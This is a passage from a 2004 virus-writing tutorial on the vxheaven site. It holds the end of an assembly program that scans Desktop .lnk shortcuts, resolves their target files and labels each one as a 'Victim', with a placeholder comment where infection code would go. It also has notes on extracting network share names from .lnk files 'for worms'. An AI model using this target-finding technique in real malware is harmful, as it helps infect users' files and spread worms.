&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Victim<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;show full path of victim</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Win32FindData<span style="color: #339933;">.</span>cFileName<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;caption: name of scanned .lnk file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MB_ICONINFORMATION &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;information 4 u</span><br/>
<span style="color: black; font-style: italic;">;*******************************************************</span><br/>
<span style="color: black; font-style: italic;">;*****HERE GO THE INFECTION***END***********************</span><br/>
<span style="color: black; font-style: italic;">;*******************************************************</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----unmap view of file--------------------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke UnmapViewOfFile<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;unmap the file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>MapAddress<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;with the address</span><br/>
<span style="color: black; font-style: italic;">;-----unmap view of file---end--------------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----close file and map handle-------------------------</span><br/>
CloseMap<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>MapHandle<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the map handle</span><br/>
<br/>
CloseFile<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke CloseHandle<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;close the handle</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>FileHandle<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;file</span><br/>
<span style="color: black; font-style: italic;">;-----close file and map handle---end-------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----find next lnk file--------------------------------</span><br/>
FindNextLNK<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke FindNextFile<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;next lnk file</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>FindHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;via find handle</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Win32FindData &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;and the structure</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> FindMoreFiles &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get more!</span><br/>
<span style="color: black; font-style: italic;">;-----find next lnk file---end--------------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----get the hell out of here--------------------------</span><br/>
Exit<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke ExitProcess<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;exit</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;current process</span><br/>
<span style="color: black; font-style: italic;">;-----get the hell out of here---end--------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----error message-------------------------------------</span><br/>
ErrorMsg<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke MessageBox<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;shit, some error</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;no owner window</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #7f007f;">&quot;Sorry, can't set desktop directory!&quot;</span><span style="color: #339933;">,</span>\ &nbsp;<span style="color: black; font-style: italic;">;text</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #7f007f;">&quot;.:: ERROR ::.&quot;</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;caption</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MB_ICONERROR &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;scary error icon ;)</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> Exit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;get out of here</span><br/>
<span style="color: black; font-style: italic;">;-----error message---end-------------------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----data's--------------------------------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DesktopSubkey &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DesktopValue &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;Desktop&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; DesktopPath &nbsp; &nbsp; rb 255d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; DesktopSize &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> 255d<br/>
&nbsp; &nbsp; &nbsp; &nbsp; RegHandle &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Reg_SZ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;REG_SZ&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Win32FindData &nbsp; FINDDATA &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;already defined by fasm</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; LnkFiles &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;*.lnk&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; FindHandle &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; FileHandle &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; MapHandle &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; MapAddress &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ItemSize &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> ?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Victim &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;rb 255d<br/>
<span style="color: black; font-style: italic;">;-----data's---end---------------------------------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----api's import, fasm will do-------------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">data</span> <span style="color: #0000ff; font-weight: bold;">import</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;only one section, fasm will do it :)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;library kernel32<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;KERNEL32.DLL&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;user32<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;USER32.DLL&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;advapi32<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;ADVAPI32.DLL&quot;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">import</span> kernel32<span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SetCurrentDirectory<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;SetCurrentDirectoryA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FindFirstFile<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;FindFirstFileA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FindNextFile<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;FindNextFileA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CreateFile<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;CreateFileA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CreateFileMapping<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;CreateFileMappingA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MapViewOfFile<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;MapViewOfFile&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; UnmapViewOfFile<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;UnmapViewOfFile&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CloseHandle<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;CloseHandle&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ExitProcess<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;ExitProcess&quot;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">import</span> advapi32<span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RegOpenKeyEx<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;RegOpenKeyExA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RegQueryValueEx<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;RegQueryValueExA&quot;</span><span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RegCloseKey<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;RegCloseKey&quot;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">import</span> user32<span style="color: #339933;">,</span>\<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MessageBox<span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;MessageBoxA&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; end <span style="color: #0000ff; font-weight: bold;">data</span><br/>
<span style="color: black; font-style: italic;">;-----api's import, fasm will do---end-------------------</span><br/>
<br/>
<span style="color: black; font-style: italic;">;_____LNKscan.asm_____cut_____end____________________________________________________</span><br/>
&nbsp;</div>
<h2><a name="c6"></a>Play more with LNK files</h2>
<p>OK, now we have hopefully get the linked file. Another interesting thing (maybe for worms) in the .lnk file is the "Network Share Name" in the "Network Volume Table". Its not very different from reading the "Volume Label", we only have to get the size of the "Shell Item ID List" and the size of the "Volume Label". Then add it all to get the offset to the "Network Volume Table". For this I have make a little graphik too:</p>
<pre>
 *****************************
 | File Begin            00h |
 *****************************
	+
 *****************************
 | File Header           4Ch |
 *****************************
	+
 *****************************
 | ItemSize              F5h |    ;size variable
 *****************************
	+
 *****************************
 | File Location Info    22h |
 *****************************
	+
 *****************************
 | Local Volume Table    10h |
 *****************************
	+
 *****************************
 | size of Volume Label  0A  |    ;size variable
 *****************************
	+
 *****************************
 | Network Volume Table  14h |
 *****************************
	=
 *****************************
 | offset Network Share Name |
 *****************************
</pre>
<p>So, you see it's not hard when we known size of "Shell Item ID List" and the size of the "Volume Label" string. "Network Share Name" is also ASCIZ, means that the zero is the end of the string.</p>
<h2><a name="c7"></a>Outro</h2>
<p>Thats the end my friend, the end of this article. Hope you learned something, or get some inspiration for other projects. If you have questions, greets or fucks feel free to send me a mail to <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="87c3eec6d8efe6f3e2f4d8eae6e4efeee9e2c7e0eaffa9e3e2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> or make a entry in my guestbook at http://www.vx-dia.de.vu ! See you...</p>
<div align="right">DiA/rrlf - 27.11.2004</div>
[<a style="" href="/lib/?lang=EN&amp;index=VT#vdi00">Back to index</a>] [<a href="/lib/vdi00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vdi00">de</a><a href="/lib/index.php?lang=en&amp;id=vdi00">en</a><a href="/lib/index.php?lang=es&amp;id=vdi00">es</a><a href="/lib/index.php?lang=it&amp;id=vdi00">it</a><a href="/lib/index.php?lang=fr&amp;id=vdi00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vdi00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vdi00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vdi00">ua</a></div>
</body>
</html>
